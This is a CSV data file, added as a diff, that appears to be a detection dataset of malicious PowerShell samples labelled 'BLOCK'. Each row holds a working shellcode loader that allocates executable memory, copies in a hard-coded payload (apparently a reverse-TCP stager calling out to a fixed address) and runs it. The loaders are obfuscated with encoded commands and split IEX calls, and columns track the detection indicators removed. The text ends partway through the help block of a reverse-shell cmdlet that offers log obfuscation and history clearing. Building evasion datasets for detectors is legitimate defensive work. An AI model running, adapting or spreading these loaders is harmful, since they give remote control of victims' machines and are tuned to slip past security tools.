@@ -1,0 +1,687 @@
+variant_id,seed_id,filename,label,target_token,technique_id,family,runtime_target,variant_rank,indicator_family_targeted,indicator_count_before,indicator_count_after,literal_indicator_removed,raw_char_len,used_char_len,was_truncated,viability_status,viability_reason,static_parse_ok,static_invariants_ok,manual_review_required,parent_content_hash,variant_content_hash,content,seed_primary_indicator,candidate_tier,candidate_reason
+variant_b37ad4b25468,seed_04ae01372a3c,3321__seed_04ae01372a3c__iex_call_operator_string.ps1,malicious,BLOCK,iex_call_operator_string,execution_indirection,cross_runtime,1,IEX,7,5,True,2543,2543,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,d5833dfac178,62d5b68e669f,"$EXRGL9 = '$cSE = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $cSE -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x5d,0x03,0x93,0x78,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ZIA=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ZIA.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ZIA,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($EXRGL9));$EXRG = ""-EncodedCommand "";if([IntPtr]::Size -eq 8){$w8jB = $env:SystemRoot + ""\syswow64\WindowsPowerShell\v1.0\powershell"";&('I'+'EX') ""& $w8jB $EXRG $e""}else{;&('I'+'EX') ""& powershell $EXRG $e"";}",-EncodedCommand,strict,parse_valid_and_invariants_ok
+variant_190ebfba2bcf,seed_04ae01372a3c,3321__seed_04ae01372a3c__iex_scriptblock_create.ps1,malicious,BLOCK,iex_scriptblock_create,execution_indirection,cross_runtime,2,IEX,7,6,True,2549,2549,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,d5833dfac178,5f9f4bbb5d6d,"$EXRGL9 = '$cSE = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $cSE -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x5d,0x03,0x93,0x78,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ZIA=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ZIA.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ZIA,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($EXRGL9));$EXRG = ""-EncodedCommand "";if([IntPtr]::Size -eq 8){$w8jB = $env:SystemRoot + ""\syswow64\WindowsPowerShell\v1.0\powershell"";&([scriptblock]::Create(""& $w8jB $EXRG $e""))}else{;iex ""& powershell $EXRG $e"";}",-EncodedCommand,strict,parse_valid_and_invariants_ok
+variant_1cedb1cf0f6d,seed_04ae01372a3c,3321__seed_04ae01372a3c__split_quoted_encodedcommand_literal.ps1,malicious,BLOCK,split_quoted_encodedcommand_literal,string_construction,cross_runtime,3,-EncodedCommand,7,6,True,2530,2530,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,d5833dfac178,240c895c9cd0,"$EXRGL9 = '$cSE = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $cSE -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x5d,0x03,0x93,0x78,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ZIA=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ZIA.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ZIA,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($EXRGL9));$EXRG = ""-Encoded""+""Command "";if([IntPtr]::Size -eq 8){$w8jB = $env:SystemRoot + ""\syswow64\WindowsPowerShell\v1.0\powershell"";iex ""& $w8jB $EXRG $e""}else{;iex ""& powershell $EXRG $e"";}",-EncodedCommand,strict,parse_valid_and_invariants_ok
+variant_3aa518fbb93d,seed_c7ebd5a8de5d,3943__seed_c7ebd5a8de5d__iex_call_operator_string.ps1,malicious,BLOCK,iex_call_operator_string,execution_indirection,cross_runtime,1,IEX,7,5,True,2957,2957,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,2ff1efced81d,34cd3f2f8f6e,"$Wef = '$IED = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $IED -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x26,0x6c,0xc9,0xb6,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x57,0x31,0x43,0x15,0x03,0x43,0x15,0x83,0xeb,0xfc,0xe2,0xd3,0x90,0x21,0x34,0x1b,0x69,0xb2,0x59,0x92,0x8c,0x83,0x59,0xc0,0xc5,0xb4,0x69,0x83,0x88,0x38,0x01,0xc1,0x38,0xca,0x67,0xcd,0x4f,0x7b,0xcd,0x2b,0x61,0x7c,0x7e,0x0f,0xe0,0xfe,0x7d,0x43,0xc2,0x3f,0x4e,0x96,0x03,0x07,0xb3,0x5a,0x51,0xd0,0xbf,0xc8,0x46,0x55,0xf5,0xd0,0xed,0x25,0x1b,0x50,0x11,0xfd,0x1a,0x71,0x84,0x75,0x45,0x51,0x26,0x59,0xfd,0xd8,0x30,0xbe,0x38,0x93,0xcb,0x74,0xb6,0x22,0x1a,0x45,0x37,0x88,0x63,0x69,0xca,0xd1,0xa4,0x4e,0x35,0xa4,0xdc,0xac,0xc8,0xbe,0x1a,0xce,0x16,0x4b,0xb9,0x68,0xdc,0xeb,0x65,0x88,0x31,0x6d,0xed,0x86,0xfe,0xfa,0xa9,0x8a,0x01,0x2f,0xc2,0xb7,0x8a,0xce,0x05,0x3e,0xc8,0xf4,0x81,0x1a,0x8a,0x95,0x90,0xc6,0x7d,0xaa,0xc3,0xa8,0x22,0x0e,0x8f,0x45,0x36,0x23,0xd2,0x01,0xa6,0x5e,0x99,0xd1,0x5e,0xd7,0x08,0xbc,0xf7,0x43,0xa3,0x0c,0x7f,0x4d,0x34,0x72,0xaa,0xa0,0xe1,0xdf,0x06,0x91,0x46,0xb3,0xc0,0x2f,0x3f,0x4a,0xb6,0xb0,0x6a,0xff,0xeb,0x24,0x96,0x53,0x5f,0xd0,0xc3,0x42,0x5f,0x20,0x1c,0xe8,0x5f,0x20,0xdc,0xde,0x05,0x65,0x94,0x14,0xfb,0x65,0x74,0x3d,0xac,0xec,0xeb,0x7b,0xad,0x3b,0x9a,0x42,0x01,0xab,0x9d,0x78,0x46,0xaf,0xcd,0x2f,0xd5,0xf8,0xa2,0x99,0xb1,0xed,0x10,0x08,0x79,0x0e,0x4f,0xc2,0x17,0xfa,0x2f,0x83,0x67,0xc9,0xcf,0x53,0xe1,0xcd,0xba,0x57,0xa1,0x67,0x24,0x0e,0x29,0x02,0x1c,0x30,0x2f,0x13,0x75,0x1f,0x63,0xb8,0x25,0xf6,0xeb,0x13,0xcc,0xee,0x90,0x94,0x05,0x8b,0xa7,0x1f,0xac,0xdb,0x52,0x06,0xd8,0x13,0x29,0x1a,0x4f,0x2b,0x87,0x30,0x30,0xbb,0x28,0xd4,0xb0,0x3b,0x41,0xd4,0xb0,0x7b,0x91,0x87,0xd8,0x23,0x35,0x74,0xfc,0x2b,0xe0,0xe9,0xad,0x80,0x82,0xea,0x05,0x4f,0x95,0xd4,0xa9,0x8f,0xc6,0x42,0xc2,0x9d,0x7e,0xe3,0xf0,0x5d,0xab,0x76,0x34,0xd5,0x99,0xf3,0xb2,0x17,0xe1,0x86,0x7d,0x62,0x00,0xd0,0xbe,0xd2,0x22,0x95,0xbf,0x12,0x4d,0x64,0x70,0xd9,0x9c,0xb4,0x43,0x19,0xcf,0x89,0x9b,0x6d,0x21,0xdb,0xee,0xbf,0x3d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$dyKx=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($dyKx.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$dyKx,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Wef));$vEF = ""-EncodedCommand "";if([IntPtr]::Size -eq 8){$i8Wb = $env:SystemRoot + ""\syswow64\WindowsPowerShell\v1.0\powershell"";&('I'+'EX') ""& $i8Wb $vEF $e""}else{;&('I'+'EX') ""& powershell $vEF $e"";}",-EncodedCommand,strict,parse_valid_and_invariants_ok
+variant_274dd0f63dd2,seed_c7ebd5a8de5d,3943__seed_c7ebd5a8de5d__iex_scriptblock_create.ps1,malicious,BLOCK,iex_scriptblock_create,execution_indirection,cross_runtime,2,IEX,7,6,True,2963,2963,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,2ff1efced81d,031036896197,"$Wef = '$IED = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $IED -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x26,0x6c,0xc9,0xb6,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x57,0x31,0x43,0x15,0x03,0x43,0x15,0x83,0xeb,0xfc,0xe2,0xd3,0x90,0x21,0x34,0x1b,0x69,0xb2,0x59,0x92,0x8c,0x83,0x59,0xc0,0xc5,0xb4,0x69,0x83,0x88,0x38,0x01,0xc1,0x38,0xca,0x67,0xcd,0x4f,0x7b,0xcd,0x2b,0x61,0x7c,0x7e,0x0f,0xe0,0xfe,0x7d,0x43,0xc2,0x3f,0x4e,0x96,0x03,0x07,0xb3,0x5a,0x51,0xd0,0xbf,0xc8,0x46,0x55,0xf5,0xd0,0xed,0x25,0x1b,0x50,0x11,0xfd,0x1a,0x71,0x84,0x75,0x45,0x51,0x26,0x59,0xfd,0xd8,0x30,0xbe,0x38,0x93,0xcb,0x74,0xb6,0x22,0x1a,0x45,0x37,0x88,0x63,0x69,0xca,0xd1,0xa4,0x4e,0x35,0xa4,0xdc,0xac,0xc8,0xbe,0x1a,0xce,0x16,0x4b,0xb9,0x68,0xdc,0xeb,0x65,0x88,0x31,0x6d,0xed,0x86,0xfe,0xfa,0xa9,0x8a,0x01,0x2f,0xc2,0xb7,0x8a,0xce,0x05,0x3e,0xc8,0xf4,0x81,0x1a,0x8a,0x95,0x90,0xc6,0x7d,0xaa,0xc3,0xa8,0x22,0x0e,0x8f,0x45,0x36,0x23,0xd2,0x01,0xa6,0x5e,0x99,0xd1,0x5e,0xd7,0x08,0xbc,0xf7,0x43,0xa3,0x0c,0x7f,0x4d,0x34,0x72,0xaa,0xa0,0xe1,0xdf,0x06,0x91,0x46,0xb3,0xc0,0x2f,0x3f,0x4a,0xb6,0xb0,0x6a,0xff,0xeb,0x24,0x96,0x53,0x5f,0xd0,0xc3,0x42,0x5f,0x20,0x1c,0xe8,0x5f,0x20,0xdc,0xde,0x05,0x65,0x94,0x14,0xfb,0x65,0x74,0x3d,0xac,0xec,0xeb,0x7b,0xad,0x3b,0x9a,0x42,0x01,0xab,0x9d,0x78,0x46,0xaf,0xcd,0x2f,0xd5,0xf8,0xa2,0x99,0xb1,0xed,0x10,0x08,0x79,0x0e,0x4f,0xc2,0x17,0xfa,0x2f,0x83,0x67,0xc9,0xcf,0x53,0xe1,0xcd,0xba,0x57,0xa1,0x67,0x24,0x0e,0x29,0x02,0x1c,0x30,0x2f,0x13,0x75,0x1f,0x63,0xb8,0x25,0xf6,0xeb,0x13,0xcc,0xee,0x90,0x94,0x05,0x8b,0xa7,0x1f,0xac,0xdb,0x52,0x06,0xd8,0x13,0x29,0x1a,0x4f,0x2b,0x87,0x30,0x30,0xbb,0x28,0xd4,0xb0,0x3b,0x41,0xd4,0xb0,0x7b,0x91,0x87,0xd8,0x23,0x35,0x74,0xfc,0x2b,0xe0,0xe9,0xad,0x80,0x82,0xea,0x05,0x4f,0x95,0xd4,0xa9,0x8f,0xc6,0x42,0xc2,0x9d,0x7e,0xe3,0xf0,0x5d,0xab,0x76,0x34,0xd5,0x99,0xf3,0xb2,0x17,0xe1,0x86,0x7d,0x62,0x00,0xd0,0xbe,0xd2,0x22,0x95,0xbf,0x12,0x4d,0x64,0x70,0xd9,0x9c,0xb4,0x43,0x19,0xcf,0x89,0x9b,0x6d,0x21,0xdb,0xee,0xbf,0x3d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$dyKx=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($dyKx.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$dyKx,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Wef));$vEF = ""-EncodedCommand "";if([IntPtr]::Size -eq 8){$i8Wb = $env:SystemRoot + ""\syswow64\WindowsPowerShell\v1.0\powershell"";&([scriptblock]::Create(""& $i8Wb $vEF $e""))}else{;iex ""& powershell $vEF $e"";}",-EncodedCommand,strict,parse_valid_and_invariants_ok
+variant_a2b0d1c81915,seed_c7ebd5a8de5d,3943__seed_c7ebd5a8de5d__split_quoted_encodedcommand_literal.ps1,malicious,BLOCK,split_quoted_encodedcommand_literal,string_construction,cross_runtime,3,-EncodedCommand,7,6,True,2944,2944,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,2ff1efced81d,7222149820a5,"$Wef = '$IED = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $IED -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x26,0x6c,0xc9,0xb6,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x57,0x31,0x43,0x15,0x03,0x43,0x15,0x83,0xeb,0xfc,0xe2,0xd3,0x90,0x21,0x34,0x1b,0x69,0xb2,0x59,0x92,0x8c,0x83,0x59,0xc0,0xc5,0xb4,0x69,0x83,0x88,0x38,0x01,0xc1,0x38,0xca,0x67,0xcd,0x4f,0x7b,0xcd,0x2b,0x61,0x7c,0x7e,0x0f,0xe0,0xfe,0x7d,0x43,0xc2,0x3f,0x4e,0x96,0x03,0x07,0xb3,0x5a,0x51,0xd0,0xbf,0xc8,0x46,0x55,0xf5,0xd0,0xed,0x25,0x1b,0x50,0x11,0xfd,0x1a,0x71,0x84,0x75,0x45,0x51,0x26,0x59,0xfd,0xd8,0x30,0xbe,0x38,0x93,0xcb,0x74,0xb6,0x22,0x1a,0x45,0x37,0x88,0x63,0x69,0xca,0xd1,0xa4,0x4e,0x35,0xa4,0xdc,0xac,0xc8,0xbe,0x1a,0xce,0x16,0x4b,0xb9,0x68,0xdc,0xeb,0x65,0x88,0x31,0x6d,0xed,0x86,0xfe,0xfa,0xa9,0x8a,0x01,0x2f,0xc2,0xb7,0x8a,0xce,0x05,0x3e,0xc8,0xf4,0x81,0x1a,0x8a,0x95,0x90,0xc6,0x7d,0xaa,0xc3,0xa8,0x22,0x0e,0x8f,0x45,0x36,0x23,0xd2,0x01,0xa6,0x5e,0x99,0xd1,0x5e,0xd7,0x08,0xbc,0xf7,0x43,0xa3,0x0c,0x7f,0x4d,0x34,0x72,0xaa,0xa0,0xe1,0xdf,0x06,0x91,0x46,0xb3,0xc0,0x2f,0x3f,0x4a,0xb6,0xb0,0x6a,0xff,0xeb,0x24,0x96,0x53,0x5f,0xd0,0xc3,0x42,0x5f,0x20,0x1c,0xe8,0x5f,0x20,0xdc,0xde,0x05,0x65,0x94,0x14,0xfb,0x65,0x74,0x3d,0xac,0xec,0xeb,0x7b,0xad,0x3b,0x9a,0x42,0x01,0xab,0x9d,0x78,0x46,0xaf,0xcd,0x2f,0xd5,0xf8,0xa2,0x99,0xb1,0xed,0x10,0x08,0x79,0x0e,0x4f,0xc2,0x17,0xfa,0x2f,0x83,0x67,0xc9,0xcf,0x53,0xe1,0xcd,0xba,0x57,0xa1,0x67,0x24,0x0e,0x29,0x02,0x1c,0x30,0x2f,0x13,0x75,0x1f,0x63,0xb8,0x25,0xf6,0xeb,0x13,0xcc,0xee,0x90,0x94,0x05,0x8b,0xa7,0x1f,0xac,0xdb,0x52,0x06,0xd8,0x13,0x29,0x1a,0x4f,0x2b,0x87,0x30,0x30,0xbb,0x28,0xd4,0xb0,0x3b,0x41,0xd4,0xb0,0x7b,0x91,0x87,0xd8,0x23,0x35,0x74,0xfc,0x2b,0xe0,0xe9,0xad,0x80,0x82,0xea,0x05,0x4f,0x95,0xd4,0xa9,0x8f,0xc6,0x42,0xc2,0x9d,0x7e,0xe3,0xf0,0x5d,0xab,0x76,0x34,0xd5,0x99,0xf3,0xb2,0x17,0xe1,0x86,0x7d,0x62,0x00,0xd0,0xbe,0xd2,0x22,0x95,0xbf,0x12,0x4d,0x64,0x70,0xd9,0x9c,0xb4,0x43,0x19,0xcf,0x89,0x9b,0x6d,0x21,0xdb,0xee,0xbf,0x3d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$dyKx=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($dyKx.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$dyKx,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Wef));$vEF = ""-Encoded""+""Command "";if([IntPtr]::Size -eq 8){$i8Wb = $env:SystemRoot + ""\syswow64\WindowsPowerShell\v1.0\powershell"";iex ""& $i8Wb $vEF $e""}else{;iex ""& powershell $vEF $e"";}",-EncodedCommand,strict,parse_valid_and_invariants_ok
+variant_a56870217220,seed_3652acdb56d5,1afa55af7c4a24da8651d273202024889d5766637d58a73e93f28afebf013b37__seed_3652acdb56d5__invoke_expression_call_operator_string.ps1,malicious,BLOCK,invoke_expression_call_operator_string,execution_indirection,cross_runtime,1,Invoke-Expression,2,1,True,9993,9993,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,e99aab2095c0,48d831611615,"<#
+.SYNOPSIS
+This cmdlet is for connecting PowerShell to a listening port on a target machine.
+
+
+.DESCRIPTION
+Establishes a connection to a listening port on a remote machine effectively completing a reverse or bind shell.
+
+
+.PARAMETER IpAddress
+This parameter is for defining the IPv4 address to connect too on a remote machine. This cmdlet looks for a connection at this IP address on the remote host.
+
+.PARAMETER Port
+This parameter is for defining the listening port to attach to on a remote machine This cmdlet looks for a connection on a remote host using the port that you speficy here.
+
+.PARAMETER Reverse
+This switch parameter sets the Reverse parameter set value to be used. This is the default parameter set value and is not required.
+
+.PARAMETER Bind
+This switch paramter sets the Bind parameter set values to be used
+
+.PARAMETER Obfuscate
+This switch parameter is used to execute PowerShell commands using Base64 in an attempt to obfuscate logs.
+
+.PARAMETER ClearHistory
+This switch parameter is used to attempt clearing the PowerShell command history upon exiting a session.
+
+
+.EXAMPLE
+Invoke-ReversePowerShell -IpAddress 192.168.2.1 -Port 1234 -ClearHistory
+# This command example connects to port 1234 on remote machine 192.168.2.1 and clear the commands executed history afterwards.
+
+.EXAMPLE
